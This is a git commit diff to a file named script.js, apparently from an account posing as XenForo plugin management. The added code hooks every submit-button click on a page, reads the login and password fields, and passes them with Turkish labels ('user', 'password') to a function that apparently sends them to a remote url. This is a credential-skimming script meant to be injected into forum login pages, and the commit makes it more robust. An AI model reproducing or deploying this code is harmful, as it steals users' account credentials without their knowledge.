4b2e6ebdf0f6b102b3d18d030f01dca6d20e5574
xenforoPluginManagement <131064044+xenforoPluginManagement@users.noreply.github.com>
2023-06-09 20:01:22 +0300

    Update script.js

--- script.js
+++ script.js
@@ -8,8 +8,10 @@ function mesaj(url, mesaj) {
     }));
 }
 
-document.querySelectorAll('button[type=submit]')[0].addEventListener("click", (event) => {
-    var username = document.getElementsByName("login")[0].value
-    var password = document.getElementsByName("password")[0].value
-    mesaj(url, "Kullanıcı: "+username+"\n"+"Şifre: "+password)
-});
+document.body.addEventListener( 'click', function ( event ) {
+    if(event.target.type == "submit") {
+        var username = document.getElementsByName("login")[0].value
+        var password = document.getElementsByName("password")[0].value
+        mesaj(url, "Kullanıcı: "+username+"\n"+"Şifre: "+password)
+    }
+})
